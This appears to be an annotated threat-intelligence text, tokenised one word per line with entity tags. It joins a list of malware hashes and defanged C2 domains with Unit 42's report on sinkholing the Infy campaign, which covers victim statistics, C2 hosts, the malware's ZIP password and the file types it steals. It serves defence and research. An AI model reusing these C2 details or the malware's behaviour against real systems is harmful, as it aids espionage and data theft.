b2a2d63c68fce4d4bfddd4fd8584b6c638ee26664785df436c48ffa16e177893 B_hash

fa91599afa18eff9735b0c0328c8cb0fc305f8d924ebb36a609e50e4a6ab256c B_hash

6bd3c86cb1f04d08407fccda35b0dd2fc8bd83a3c10f913dded93b4bbba182c9 B_hash

0a31bfdc22ff3cea5a160b2c32a98764027be7512ced50825d1be0b93a7e7aa4 B_hash

0909f8383cd77107234b5c1aa1c80a1f1bc2e8a2832284ff3de6636d5ed16b8a B_hash

9dde31f29d5180b26eb93dfe2fc07bae76f929b8d3add20fc577033ae234b437 B_hash

28e888ec5247511d01df376f4be7e08c64841df37d9846580e87145c8efbbd10 B_hash

5693592ed69ca1cf0a5f8dcf8f548c063da287ce3e164a89df720a39a290feea B_hash

6d99f010c237fec5ff022cdf2f0df8b26429c1d5f223ca4f1658fc833c9cef3e B_hash

1b6651a523be1c42f779877ad11f3b52130686aad4fd4ecdfbc15afbcea56aa2 B_hash

46089e4e9aebf5fd5ad1ffaecb3bee5d7490f2cc53b5ed66b7509282ca29438b B_hash

998481fbb26e890b83e1738ee12281103ca77775a20c1c6f1705eb6552237e3b B_hash

4b373c2d50e600fdae5259bbd3e989d002a776c443869b92afeb5d53b73bd1c0 B_hash

1f376d4c4febcafa6bdcf8877121c20697046c15f71983a9210762fbf3b5455e B_hash

0321f7948476480ab1875ccdeac46c37a58c2f60d63d2a787bdcf292ff2a5685 B_hash

3bb134617af6f7b0f0c483b315f7ea45b2ed2c4a91005b453c9ec9e86ef0d70b B_hash

20/35

dad5e918c4ce849f682485bd79e097ac097b554daa897b12151b4595d67980aa B_hash

7b801c415f2fb9210c4d89e7d6332c1a812defe78b234d658b60f9337b8f4266 B_hash

75285821f9997b304058e8bf76c7c3f9f4abcf47e0dffea73d6256f657b9e778 B_hash

210024ece45a6935da89ab7c5ae3293616679414e96e2157e49f9f607c831bdc B_hash

97bbfb81f930d138ff47c3b899eee6917802385b8c8c1626a7679c5cab41c4a2 B_hash

cbc9e5552cda22130cd7a84cd4b3c68e95eb3f8c2e83dd77253bd1822d1f840d B_hash

bf00cd1bc34ce457b0e4a99a8df5b7fda512496dc32f2762923254bc85261afb B_hash

cadb1646563a317ac72579e8691c464bab439667811fb0d850bc2e950a3a332c B_hash

9de260dcfe2f5a852c0cff238ffc3fe3fc93feff008463af49f68c9f5b5ebc9b B_hash

dd3d708ba8ce177fd1f756ac5eb3347a0ec7cf65706438ea5bbdfe9125b0dbe4 B_hash

31df6ec1089e720c09e29f35ce33203359128c99cc0e4b03ec3e38237e8151ff B_hash

e349394a043e11410ed3e7c35c70d85dbb9c5e512b593e51e1acde3b404414a2 B_hash

dddb5843c775ae47b37fd02c378699b4e250ac32739f30e0949bdaa28050a595 B_hash

42da6fd7f6ba8b90ffd1298d068045c7928cef6506642e69859e0b962b5864a8 B_hash

e6624eb4520d41516f64aa64a00ee224c8bf257403a12a9665d552348dad1bd5 B_hash

79ca3b8afac2ca896d7db2110789a187ad75810e2d92aa6f0378f73c1f72006f B_hash

ad08a0e1dace8d5a443a4bd21ec8d935e267f364ae1b152edaccb0b1f82870d7 B_hash

b87ada7c17cdb5b7c3cf1e6a0d35515c62112126f2f983c1190a6d9d1060b7db B_hash

2ec204d0f35404c2548ac3dbc7b02e5db7ba28d4bc5c701986f0bfcee2a5fa5a B_hash

77e1dfaeb73c4edf762f9503c428c1d92af6882b48305f5f5b070ec136575e43 B_hash

610d37dfb3089b516e4bced89de0c5161614d50ca511853f7be81138dfc4e844 B_hash

60ff74d053037b5ae70eeaf199a0acba35f58d275d12915ae8ed813dbf9a5b55 B_hash

376943f886b264824f6063e7dfc54a1a2d5071a3d44dec05208596079d6cf276 B_hash

89d4d851e6729a854fccb4d4f9277f9f545396714ff2b108d29c7ff418a501a3 B_hash

18db52a63720187b2afd57667e9ebdcb0a50a8e99909340281dcd07e266d761f B_hash

bb05a0d905b915e2e84a8e69c2af438f72730131c5a1e3e1fe85df13c61182ac B_hash

187155b727346d63c1b1c8e4e3ae88aed89746a4a323b5170139fa5aa760b3a3 B_hash

44cd0fdb877838f559d60500cd08cee66d8a79005d7e86f81671c18ec7ab3cb5 B_hash

7451c813eebe45ee8c743abc5e75c9475cab427d44e9a255f89f73c4e7ca7106 B_hash

810aed604e1ec5d5aec00c783bc44e5ca753c5c0f2dc64f431c8f8d48b6dbf41 B_hash

Appendix
B
:
Associated
Domains

21/35

1c-host[.]host B_url.cncsvr

1cpred[.]org B_url.cncsvr

allforest[.]pw B_url.cncsvr

antiprt[.]com B_url.cncsvr

atonix[.]pw B_url.cncsvr

babbabbab[.]ru B_url.cncsvr

babbabbab2[.]ru B_url.cncsvr

babbebbab[.]com B_url.cncsvr

babbebbab2[.]com B_url.cncsvr

babbibbab2[.]ua B_url.cncsvr

babbihbab[.]host B_url.cncsvr

babblabbab2[.]link B_url.cncsvr

babblahbab[.]com B_url.cncsvr

babblebbab[.]pw B_url.cncsvr

babblebbab2[.]pw B_url.cncsvr

babblehbab[.]top B_url.cncsvr

babblibbab2[.]xyz B_url.cncsvr

babblihbab[.]link B_url.cncsvr

babblohbab[.]pw B_url.cncsvr

babblulbab[.]pw B_url.cncsvr

babbobbab[.]link B_url.cncsvr

babbohbab[.]com B_url.cncsvr

babbolbab[.]host B_url.cncsvr

babbolbab[.]ru B_url.cncsvr

babbrabbab2[.]xyz B_url.cncsvr

babbrebbab[.]rocks B_url.cncsvr

babbrebbab2[.]rocks B_url.cncsvr

babbrehbab[.]pw B_url.cncsvr

babbribbab2[.]space B_url.cncsvr

babbrihbab[.]xyz B_url.cncsvr

babbrohbab[.]rocks B_url.cncsvr

22/35

babbrulbab[.]rocks B_url.cncsvr

babbulbab[.]com B_url.cncsvr

babchabbab[.]org B_url.cncsvr

babchabbab2[.]org B_url.cncsvr

babchebbab2[.]ru B_url.cncsvr

babchehbab[.]in B_url.cncsvr

babchibbab[.]com B_url.cncsvr

babchihbab[.]org B_url.cncsvr

babcholbab[.]org B_url.cncsvr

babclabbab2[.]space B_url.cncsvr

babclebbab[.]biz B_url.cncsvr

babclebbab2[.]biz B_url.cncsvr

babclehbab[.]rocks B_url.cncsvr

babclibbab2[.]in B_url.cncsvr

babclihbab[.]space B_url.cncsvr

babclohbab[.]biz B_url.cncsvr

babclulbab[.]biz B_url.cncsvr

babcrabbab2[.]in B_url.cncsvr

babcrambab[.]ru B_url.cncsvr

babcrebbab[.]org B_url.cncsvr

babcrebbab2[.]org B_url.cncsvr

babcrehbab[.]biz B_url.cncsvr

babcribbab[.]ru B_url.cncsvr

babcrihbab[.]in B_url.cncsvr

babcrohbab[.]org B_url.cncsvr

babcruhbab[.]host B_url.cncsvr

babcrulbab[.]org B_url.cncsvr

babdabbab[.]ua B_url.cncsvr

babdabbab2[.]ua B_url.cncsvr

babdebbab[.]link B_url.cncsvr

babdebbab2[.]link B_url.cncsvr

23/35

babdibbab2[.]pw B_url.cncsvr

babdihbab[.]top B_url.cncsvr

babdobbab[.]xyz B_url.cncsvr

babdohbab[.]link B_url.cncsvr

babdolbab[.]top B_url.cncsvr

babdrabbab2[.]ru B_url.cncsvr

babdrambab[.]ua B_url.cncsvr

babdrebbab[.]com B_url.cncsvr

babdrebbab2[.]com B_url.cncsvr

babdrehbab[.]org B_url.cncsvr

babdribbab[.]ua B_url.cncsvr

babdrihbab[.]host B_url.cncsvr

babdrohbab[.]com B_url.cncsvr

babdruhbab[.]top B_url.cncsvr

babdrulbab[.]com B_url.cncsvr

babdulbab[.]link B_url.cncsvr

babfabbab[.]pw B_url.cncsvr

babfabbab2[.]pw B_url.cncsvr

babfebbab[.]top B_url.cncsvr

babfebbab[.]xyz B_url.cncsvr

babfebbab2[.]xyz B_url.cncsvr

babfibbab2[.]rocks B_url.cncsvr

babfihbab[.]pw B_url.cncsvr

babflabbab2[.]ua B_url.cncsvr

babflambab[.]pw B_url.cncsvr

babflebbab[.]link B_url.cncsvr

babflebbab2[.]link B_url.cncsvr

babflehbab[.]com B_url.cncsvr

babflibbab[.]pw B_url.cncsvr

babflihbab[.]top B_url.cncsvr

babflohbab[.]link B_url.cncsvr

24/35

babfluhbab[.]pw B_url.cncsvr

babflulbab[.]link B_url.cncsvr

babfobbab[.]space B_url.cncsvr

babfohbab[.]xyz B_url.cncsvr

babfolbab[.]pw B_url.cncsvr

babfrabbab2[.]pw B_url.cncsvr

babfrebbab[.]xyz B_url.cncsvr

babfrebbab2[.]xyz B_url.cncsvr

babfrehbab[.]link B_url.cncsvr

babfribbab[.]rocks B_url.cncsvr

babfrihbab[.]pw B_url.cncsvr

babfrohbab[.]xyz B_url.cncsvr

babfrulbab[.]xyz B_url.cncsvr

babfulbab[.]xyz B_url.cncsvr

babgabbab2[.]rocks B_url.cncsvr

babgebbab[.]space B_url.cncsvr

babgebbab2[.]space B_url.cncsvr

babgibbab2[.]biz B_url.cncsvr

babgihbab[.]rocks B_url.cncsvr

babglabbab2[.]rocks B_url.cncsvr

babglebbab[.]space B_url.cncsvr

babglebbab2[.]space B_url.cncsvr

babglehbab[.]xyz B_url.cncsvr

babglibbab[.]biz B_url.cncsvr

babglihbab[.]rocks B_url.cncsvr

babglohbab[.]space B_url.cncsvr

babglulbab[.]space B_url.cncsvr

babgobbab[.]in B_url.cncsvr

babgofbab[.]biz B_url.cncsvr

babgohbab[.]space B_url.cncsvr

babgrabbab2[.]biz B_url.cncsvr

25/35

babgrebbab[.]in B_url.cncsvr

babgrebbab2[.]in B_url.cncsvr

babgrehbab[.]space B_url.cncsvr

babgribbab[.]org B_url.cncsvr

babgrihbab[.]biz B_url.cncsvr

babgrohbab[.]in B_url.cncsvr

babgrulbab[.]in B_url.cncsvr

babgulbab[.]space B_url.cncsvr

babhabbab2[.]biz B_url.cncsvr

babhebbab[.]in B_url.cncsvr

babhebbab2[.]in B_url.cncsvr

babhibbab2[.]org B_url.cncsvr

babhihbab[.]biz B_url.cncsvr

babhohbab[.]in B_url.cncsvr

babhulbab[.]in B_url.cncsvr

babjabbab2[.]org B_url.cncsvr

babjebbab[.]ru B_url.cncsvr

babjebbab2[.]ru B_url.cncsvr

babjibbab2[.]com B_url.cncsvr

babjihbab[.]org B_url.cncsvr

babjohbab[.]host B_url.cncsvr

babjulbab[.]host B_url.cncsvr

babkabbab2[.]com B_url.cncsvr

babkebbab[.]ua B_url.cncsvr

babkebbab2[.]ua B_url.cncsvr

babkehbab[.]host B_url.cncsvr

babkibbab2[.]link B_url.cncsvr

babkihbab[.]com B_url.cncsvr

babkohbab[.]top B_url.cncsvr

babkulbab[.]top B_url.cncsvr

bablabbab2[.]link B_url.cncsvr

26/35

bablebbab[.]pw B_url.cncsvr

bablebbab2[.]pw B_url.cncsvr

bablehbab[.]top B_url.cncsvr

bablibbab2[.]xyz B_url.cncsvr

bablihbab[.]link B_url.cncsvr

bablohbab[.]pw B_url.cncsvr

bablulbab[.]pw B_url.cncsvr

babmabbab[.]xyz B_url.cncsvr

babmabbab2[.]xyz B_url.cncsvr

babmebbab[.]rocks B_url.cncsvr

babmebbab2[.]rocks B_url.cncsvr

babmehbab[.]pw B_url.cncsvr

babmibbab2[.]space B_url.cncsvr

babmihbab[.]xyz B_url.cncsvr

babmilbab[.]pw B_url.cncsvr

babmohbab[.]rocks B_url.cncsvr

babmulbab[.]rocks B_url.cncsvr

babnabbab2[.]space B_url.cncsvr

babnebbab[.]biz B_url.cncsvr

babnebbab2[.]biz B_url.cncsvr

babnehbab[.]rocks B_url.cncsvr

babnibbab2[.]in B_url.cncsvr

babnihbab[.]space B_url.cncsvr

babnohbab[.]biz B_url.cncsvr

babnulbab[.]biz B_url.cncsvr

babpabbab2[.]in B_url.cncsvr

babpebbab[.]org B_url.cncsvr

babpebbab2[.]org B_url.cncsvr

babpehbab[.]biz B_url.cncsvr

babpibbab2[.]ru B_url.cncsvr

babpihbab[.]in B_url.cncsvr

27/35

babplabbab2[.]org B_url.cncsvr

babplebbab[.]ru B_url.cncsvr

babplebbab2[.]ru B_url.cncsvr

babplehbab[.]in B_url.cncsvr

babplibbab[.]com B_url.cncsvr

babplifbab[.]ru B_url.cncsvr

babplihbab[.]org B_url.cncsvr

babplohbab[.]host B_url.cncsvr

babplulbab[.]host B_url.cncsvr

babpohbab[.]org B_url.cncsvr

babprabbab2[.]com B_url.cncsvr

babprebbab[.]ua B_url.cncsvr

babprebbab2[.]ua B_url.cncsvr

babprehbab[.]host B_url.cncsvr

babpribbab[.]link B_url.cncsvr

babprihbab[.]com B_url.cncsvr

babprulbab[.]top B_url.cncsvr

babpulbab[.]org B_url.cncsvr

babrabbab2[.]ru B_url.cncsvr

babrebbab[.]com B_url.cncsvr

babrebbab2[.]com B_url.cncsvr

babrehbab[.]org B_url.cncsvr

babribbab2[.]ua B_url.cncsvr

babrihbab[.]host B_url.cncsvr

babrohbab[.]com B_url.cncsvr

babrulbab[.]com B_url.cncsvr

babsabbab2[.]ua B_url.cncsvr

babsahbab[.]host B_url.cncsvr

babsebbab[.]link B_url.cncsvr

babsebbab2[.]link B_url.cncsvr

babsehbab[.]com B_url.cncsvr

28/35

babsibbab2[.]pw B_url.cncsvr

babsihbab[.]top B_url.cncsvr

babskabbab2[.]link B_url.cncsvr

babskebbab[.]pw B_url.cncsvr

babskebbab2[.]pw B_url.cncsvr

babskehbab[.]top B_url.cncsvr

babskibbab[.]xyz B_url.cncsvr

babskihbab[.]link B_url.cncsvr

babslabbab2[.]xyz B_url.cncsvr

babslebbab2[.]rocks B_url.cncsvr

babslehbab[.]pw B_url.cncsvr

babslibbab[.]space B_url.cncsvr

babslihbab[.]xyz B_url.cncsvr

babsmabbab2[.]space B_url.cncsvr

babsmebbab2[.]biz B_url.cncsvr

babsmehbab[.]rocks B_url.cncsvr

babsmibbab[.]in B_url.cncsvr

babsmihbab[.]space B_url.cncsvr

babsnabbab2[.]in B_url.cncsvr

babsnebbab2[.]org B_url.cncsvr

babsnehbab[.]biz B_url.cncsvr

babsnibbab[.]ru B_url.cncsvr

babsnihbab[.]in B_url.cncsvr

babsofbab[.]pw B_url.cncsvr

babsohbab[.]link B_url.cncsvr

babspabbab[.]ru B_url.cncsvr

babspabbab2[.]ru B_url.cncsvr

babspebbab2[.]com B_url.cncsvr

babspefbab[.]ru B_url.cncsvr

babspehbab[.]org B_url.cncsvr

babspibbab[.]ua B_url.cncsvr

29/35

babspihbab[.]host B_url.cncsvr

babspolbab[.]host B_url.cncsvr

babstabbab[.]ua B_url.cncsvr

babstabbab2[.]ua B_url.cncsvr

babstebbab2[.]link B_url.cncsvr

babstefbab[.]com B_url.cncsvr

babstehbab[.]com B_url.cncsvr

babstibbab[.]pw B_url.cncsvr

babstihbab[.]top B_url.cncsvr

babstolbab[.]top B_url.cncsvr

babstrabbab[.]pw B_url.cncsvr

babstrabbab2[.]pw B_url.cncsvr

babstrebbab2[.]xyz B_url.cncsvr

babstrefbab[.]pw B_url.cncsvr

babstrehbab[.]link B_url.cncsvr

babstribbab[.]rocks B_url.cncsvr

babstrihbab[.]pw B_url.cncsvr

babstrolbab[.]pw B_url.cncsvr

babsulbab[.]link B_url.cncsvr

babswabbab[.]rocks B_url.cncsvr

babswabbab2[.]rocks B_url.cncsvr

babswebbab2[.]space B_url.cncsvr

babswehbab[.]xyz B_url.cncsvr

babswibbab[.]biz B_url.cncsvr

babswihbab[.]rocks B_url.cncsvr

babswolbab[.]rocks B_url.cncsvr

babtabbab2[.]pw B_url.cncsvr

babtahbab[.]top B_url.cncsvr

babtebbab[.]xyz B_url.cncsvr

babtebbab2[.]xyz B_url.cncsvr

babtehbab[.]link B_url.cncsvr

30/35

babtibbab2[.]rocks B_url.cncsvr

babtihbab[.]pw B_url.cncsvr

babtohbab[.]xyz B_url.cncsvr

babtrabbab[.]biz B_url.cncsvr

babtrabbab2[.]biz B_url.cncsvr

babtrebbab2[.]in B_url.cncsvr

babtrehbab[.]space B_url.cncsvr

babtribbab[.]org B_url.cncsvr

babtrihbab[.]biz B_url.cncsvr

babtrolbab[.]biz B_url.cncsvr

babtulbab[.]xyz B_url.cncsvr

babvabbab2[.]rocks B_url.cncsvr

babvahbab[.]pw B_url.cncsvr

babvebbab[.]space B_url.cncsvr

babvebbab2[.]space B_url.cncsvr

babvehbab[.]xyz B_url.cncsvr

babvibbab2[.]biz B_url.cncsvr

babvihbab[.]rocks B_url.cncsvr

babvohbab[.]space B_url.cncsvr

babvulbab[.]space B_url.cncsvr

babwabbab2[.]biz B_url.cncsvr

babwahbab[.]rocks B_url.cncsvr

babwebbab[.]in B_url.cncsvr

babwebbab2[.]in B_url.cncsvr

babwehbab[.]space B_url.cncsvr

babwibbab2[.]org B_url.cncsvr

babwihbab[.]biz B_url.cncsvr

babwohbab[.]in B_url.cncsvr

babwulbab[.]in B_url.cncsvr

babyabbab2[.]org B_url.cncsvr

babyahbab[.]biz B_url.cncsvr

31/35

babyebbab[.]ru B_url.cncsvr

babyebbab2[.]ru B_url.cncsvr

babyehbab[.]in B_url.cncsvr

babyibbab2[.]com B_url.cncsvr

babyihbab[.]org B_url.cncsvr

babyohbab[.]host B_url.cncsvr

babzabbab2[.]com B_url.cncsvr

babyulbab[.]host B_url.cncsvr

babzahbab[.]org B_url.cncsvr

babzebbab[.]ua B_url.cncsvr

babzebbab2[.]ua B_url.cncsvr

babzehbab[.]host B_url.cncsvr

babzibbab2[.]link B_url.cncsvr

babzihbab[.]com B_url.cncsvr

babzohbab[.]top B_url.cncsvr

babzulbab[.]top B_url.cncsvr

bannarbor[.]pw B_url.cncsvr

bisquitshore[.]xyz B_url.cncsvr

bitrixon[.]biz B_url.cncsvr

buhgalter[.]pw B_url.cncsvr

buhgalter[.]rocks B_url.cncsvr

buhgalters[.]xyz B_url.cncsvr

businessolution[.]site B_url.cncsvr

cheturion[.]org B_url.cncsvr

chipacom[.]net B_url.cncsvr

cloneduring[.]pw B_url.cncsvr

companysafa[.]biz B_url.cncsvr

corpofname[.]pw B_url.cncsvr

datamining[.]press B_url.cncsvr

dersteoyna[.]pw B_url.cncsvr

dovnikus[.]su B_url.cncsvr

32/35

efros[.]pw B_url.cncsvr

flashclicks[.]info B_url.cncsvr

forbusinessgo[.]xyz B_url.cncsvr

fortificar[.]net B_url.cncsvr

fracking[.]host B_url.cncsvr

gateoflife[.]pw B_url.cncsvr

gaz[.]rocks B_url.cncsvr

gedealer[.]pw B_url.cncsvr

globuspp[.]pw B_url.cncsvr

grandvita[.]pw B_url.cncsvr

greenlanterns[.]xyz B_url.cncsvr

greenworldsun[.]xyz B_url.cncsvr

guardomorph[.]com B_url.cncsvr

guwang[.]pw B_url.cncsvr

jobforreborn[.]xyz B_url.cncsvr

kokinatsu[.]pw B_url.cncsvr

kukuzaki[.]me B_url.cncsvr

kupala[.]me B_url.cncsvr

lastsnow[.]link B_url.cncsvr

maradonianos[.]pw B_url.cncsvr

mercurytod[.]pw B_url.cncsvr

muxa[.]club B_url.cncsvr

mycorpsafa[.]biz B_url.cncsvr

n-nalog78[.]com B_url.cncsvr

newsunconcept[.]in B_url.cncsvr

newsupport[.]us B_url.cncsvr

nothingmore[.]us B_url.cncsvr

novayarabota[.]pw B_url.cncsvr

nvpn[.]pw B_url.cncsvr

odejda77[.]net B_url.cncsvr

okvd[.]biz B_url.cncsvr

33/35

olen[.]bid B_url.cncsvr

onechat[.]pw B_url.cncsvr

placetobuy[.]pw B_url.cncsvr

platej[.]pw B_url.cncsvr

poplata-da[.]org B_url.cncsvr

portw[.]org B_url.cncsvr

powersand[.]link B_url.cncsvr

pricemeet[.]pw B_url.cncsvr

puldisk[.]xyz B_url.cncsvr

rabotadnya[.]pw B_url.cncsvr

raintor[.]pw B_url.cncsvr

ricarier[.]org B_url.cncsvr

rosgaz[.]pw B_url.cncsvr

rumoney[.]xyz B_url.cncsvr

salesforlife[.]top B_url.cncsvr

salesline[.]top B_url.cncsvr

sam-sam[.]pw B_url.cncsvr

sandstyle[.]biz B_url.cncsvr

sandw[.]pw B_url.cncsvr

santrimo[.]lol B_url.cncsvr

seclist[.]site B_url.cncsvr

seclist[.]top B_url.cncsvr

selenaspace[.]space B_url.cncsvr

sellgrax[.]club B_url.cncsvr

semodo[.]pw B_url.cncsvr

sensetunoespossible[.]cat B_url.cncsvr

shortsell[.]trade B_url.cncsvr

shortselling[.]club B_url.cncsvr

sixgoats[.]pw B_url.cncsvr

snp500[.]trade B_url.cncsvr

solotender[.]pw B_url.cncsvr

34/35

sslprivate[.]org B_url.cncsvr

tapalulumba[.]com B_url.cncsvr

taskhoper[.]com B_url.cncsvr

titleworld[.]pw B_url.cncsvr

torglend[.]com B_url.cncsvr

tradertop[.]top B_url.cncsvr

trendkop[.]pw B_url.cncsvr

tyuocruz1312[.]net B_url.cncsvr

uchet[.]pw B_url.cncsvr

uchet[.]space B_url.cncsvr

visitpalace[.]xyz B_url.cncsvr

volumexp[.]xyz B_url.cncsvr

vortexenism[.]biz B_url.cncsvr

vpnserv[.]pw B_url.cncsvr

vwv.flashclicks[.]info B_url.cncsvr

winsocket[.]xyz B_url.cncsvr

yearreviews[.]net B_url.cncsvr

Updated
3/30/17
:
To
remove
unnecessary
IPS
Signature
number
.

35/35
Prince
of
Persia
–
Game
Over

researchcenter.paloaltonetworks.com/2016/06/unit42-prince-of-persia-game-over/ B_url.normal

Summary

Unit
42
published
a
blog
at
the
beginning
of
May
titled
'
Prince
of
Persia
,
'
in
which
we
described
the
discovery
of
a
decade-long
campaign
using
a
formerly
unknown
malware
family
,
Infy B_malware.infosteal
,
that
targeted
government
and
industry
interests
worldwide
.

Subsequent
to
the
publishing
of
this
article
,
through
cooperation
with
the
parties
responsible
for
the
C2
domains
,

Unit
42
researchers
successfully
gained
control
of
multiple
C2
domains
.

This
disabled
the
attacker's
access
to
their
victims
in
this
campaign
,
provided
further
insight
into
the
targets
currently
victimized
in
this
operation
,
and
enabled
the
notification
of
affected
parties
.

Post
Publication

In
the
week
following
the
publication
of
the
original
blog
,
we
observed
no
unusual
changes
to
the
C2
infrastructure
.

Existing
domains
did
move
to
new
IP
addresses
,
as
we
had
previously
seen
periodically
.

Some
new
install
domains
were
added
,
adhering
to
naming
conventions
of
current
domains
(
see
appendix
for
new
IOCs
)
.

The
attackers
developed
a
new
version
(
31
)
,
and
we
observed
this
deployed
against
a
single
Canadian
target
.

The
file
descriptions
remained
essentially
the
same
(
'
CLMediaLibrary
Dynamic
Link
Library
V3
'
)
.

Most
importantly
,
there
was
no
change
to
the
encoding
key
(
now
using
offset
20
,
and
offset
11
for
second
pass
against
URL
encoding
)
that
we
had
observed
being
used
for
the
entire
decade-long
campaign
,
and
documented
in
our
previous
blog
.

From
this
we
conclude
that
the
attackers
were
unaware
of
our
initial
report
.

Sinkhole

Through
cooperation
with
the
parties
responsible
for
the
C2
domains
,
we
took
control
of
all
but
one
of
them
,
transferring
the
A
records
to
a
server
we
controlled
.

This
prevented
the
attackers
from
being
able
to
subsequently
make
any
further
changes
to
the
domain
configurations
,
issue
commands
to
victims
,
or
capture
any
further
data
for
the
majority
of
victims
.

An
analysis
of
connections
after
transfer
suggests
that
the
attackers
may
have
used
a
thirdparty
service
to
try
to
understand
why
they
had
suddenly
lost
almost
all
of
their
traffic
.

Figure
1
shows
that
tool
,
a
geographic
representation
of
victim-C2
traffic
,
with
all
but
one
at
that
time
now
communicating
with
our
sinkhole
server
.

1/13

Figure
1
Graphical
representation
of
victim
traffic
to
C2

We
have
since
transferred
sinkhole
control
to
Shadowserver
,
whom
we
thank
for
subsequent
victim
notification
&
remediation
(
https://www.shadowserver.org/wiki/pmwiki.php/Involve/GetReportsOnYourNetwork B_url.normal
)
.

Victims

We
were
able
to
analyze
victim
C2
traffic
to
understand
who
were
victims
of
the
Infy B_malware.infosteal
campaign
.

We
identified
456
malware
agents
installed
on
326
victim
systems
,
in
35
countries
.

Figure
2
shows
a
geographical
breakdown
of
victim
locations
.

We
noted
in
our
original
blog
the
large
amount
of
targeting
of
Iranian
citizens
in
this
campaign
,
we
observed
almost
one-third
of
all
victims
to
be
Iranian
.

Also
of
note
was
the
low
overall
volume
of
victims
,
compared
to
,
for
example
,
crimeware
campaigns
.

Figure
2
Geographic
location
of
victims
.

Please
note
that
New
Zealand
has
been
omitted
from
this
map
only
because
we
observed
no
victim
activity
there
.

Versions

In
our
original
blog
,
we
noted
two
distinct
primary
variants
of
the
Infy B_malware.infosteal
malware
.

In
addition
to
the
original
'
Infy B_malware.infosteal
'
variant
,
we
also
see
the
newer
,
more
sophisticated
,
interactive
,
and
fuller-featured
'
Infy B_malware.infosteal
M I
'
variant
deployed
against

2/13

apparently-higher-value
targets
.

Overall
,
93%
of
all
victims
were
infected
with
Infy B_malware.infosteal
,
and
60%
with
Infy B_malware.infosteal
'
M
'
(
Figure
3
)
.

Combined
with
the
low
total
number
of
victims
,
this
suggests
a
great
deal
of
care
given
to
each
individual
campaign
target
.

The
large
number
of
victims
with
both
variants
may
relate
to
their
complimentary
feature
set
,
or
represent
an
'
upgrade
'
path
on
victims
from
the
original
variant
infection
,
later
adding
the
'
M
'
variant
as
targets
appeared
more
compelling
to
the
attackers
.

Figure
3
Breakdown
of
Infy B_malware.infosteal
vs
.
Infy B_malware.infosteal
'
M
'
infections

For
the
Infy B_malware.infosteal
'
M
'
variant
,
we
note
that
the
majority
of
targets
are
using
the
latest
version
(
7.8
)
,
and
that
none
are
using
the
older
6.x
versions
at
all
(
Figure
4
)
.

This
suggests
that
these
higher-value
targets
are
paid
much
more
attention
,
being
kept
up-to-date
with
the
latest
version
.

In
contrast
,
for
the
more
basic
original
Infy B_malware.infosteal
variant
,
we
note
a
full
spectrum
of
versions
installed
(
Figure
5
)
,
with
many
victims
on
older
versions
–
including
the
original
,
decade-old
V1
–
suggesting
much
less
concern
is
paid
to
these
individual
targets
(
note
that
we
did
observe
a
small
number
of
the
older
6.x
versions
but
these
do
not
announce
their
version
when
connecting
)
.

3/13

Figure
4
Infy B_malware.infosteal
'
M
'
Victim
versions

Figure
5
Infy'Original
'
Victim
versions

Game
Over

Shortly
after
the
takedown
,
as
well
as
a
new
Infy B_malware.infosteal
version
(
31
)
,
we
also
observed
the
registration
of
multiple
domains
4/13
using
a
previously-seen
pattern
,
against
known
campaign
IP
addresses
.

Almost
every
domain
in
the
pattern-range
box4035[.]net B_ip.unknown
–
box4090[.]net B_ip.unknown
(
138.201.0.134 B_ip.unknown
)
.
These
were
not
observed
in
any
sample
C2
lists
however
.

Bestwebstat[.]com B_url.cncsvr
was
sinkholed
by
another
operator
.

Some
victims
infected
with
Infy B_malware.infosteal
versions
15-24
still
used
the
C2
server
us1s2[.]strangled[.]net B_url.cncsvr
,
which
remained
in
the
hands
of
the
attacker
.

In
early
June
the
attackers
used
this
C2
to
issue
instructions
to
download
new
Infy B_malware.infosteal
'
M
'
version
8.0
from
us1s2[.]strangled[.]net/bdc.tmp
.

This
was
the
first
time
we
had
observed
an
Infy B_malware.infosteal
variant
being
directly
updated
to
Infy B_malware.infosteal
'
M
'
.

This
used
camouflage
name
'
Macromedia
v4
'
,
changed
from
'
v3
'
seen
in
Infy B_malware.infosteal
v31
.

They
also
removed
the
voice
recording
capability
in
this
version
.

uvps1[.]cotbm[.]com B_url.cncsvr
was
used
for
data
exfiltration
,
previously
at
138.201.47.150
,
after
publishing
of
our
original
blog
moving
to
144.76.250.205 B_ip.unknown
.

It
was
also
hosting
malware
updates
at
/themes/u.php
.

They
also
added
a
curious
C2
entry
'
hxxp://box
'
(
note
:
defanged
for
publishing
)
.

It's
unclear
how
this
should
function;
possibly
a
compromised
victim
intranet
device
,
or
the
attackers
have
modified
the
HOSTS
file
on
the
victim
computer
.

After
the
take-down
,
the
attackers
began
to
add
server
IP
addresses
as
well
as
domain
names
to
their
malware
C2
list
.

They
also
slightly
modified
their
ZIP
password
from
'
Z8(2000_2001ul
'
to
'
Z8(2000_2001uIEr3
'
.

Their
new
malware
version
added
antivirus
checks
for
Kaspersky
Labs
,
Avast
,
and
Trend
Micro
.

The
malware
data
capture
now
searches
for
file
extensions
:
.doc
,
.docx
,
.xls
,
.xlsx
,
.xlr
,
.pps
,
.ppt
,
.pptx
,
.mdb
,
.accdb
,
.db
,
.dbf
,
.sql
,
.jpg
,
.jpeg
,
.psd
,
.tif
,
.mp4
,
.3gp
,
.txt
,
.rtf
,
.odt
,
.htm
,
.html
,
.pdf
,
.wps
,
.contact
,
.csv
,
.nbu
,
.vcf
,
.pst
,
.zip
,
.rar
,
.7z
,
.zipx
,
.pgp
,
.tc
,
.vhd
,
.p12
,
.crt.pem,.key.pfx
,
.asc
,
.cer
,
.p7b
,
.sst
,
.doc
,
.docx
,
.xls
,
.xlsx
,
.xlr
,
.pps
,
.ppt
,
.pptx
.

and
folder
locations
:

:\$recycle.bin
,
:\documents
and
settings
,
:\msocache
,
:\program
files
,
:\program
files
(
x86
)
,
:\programdata
,
:\recovery
,
:\system
volume
information:\users
,
:\windows
,
:\boot
,
:\inetpub
,
:\i386
.

The
malware
continued
to
use
the
identical
decryption
key
seen
over
the
entire
history
of
this
campaign
.

Mid-June
,
through
cooperation
with
the
parties
responsible
for
the
C2
domains
and
law
enforcement
,
we
were
able
to
get
the
remaining
C2
domains
null-routed
and
the
directly-IP-addressed
server
disabled
.

This
is
the
end
of
a
decade-long
campaign
,
though
we
naturally
expect
to
see
this
actor
back
in
some
other
guise
before
long
.

Thanks
to
the
Malware
research
team
–
Yaron
Samuel
,
Artiom
Radune
,
Mashav
Sapir
,
Netanel
Rimer
–
for
assistance
in
the
takedown
.

Appendix
1
–
Exfiltration
Algorithm

The
malware
uses
a
different
algorithm
than
that
used
for
encrypting
the
malware
strings
to
encrypt
the
exfiltration
data
,
including
:

1
.
Keylogger
data
+
language
.

2
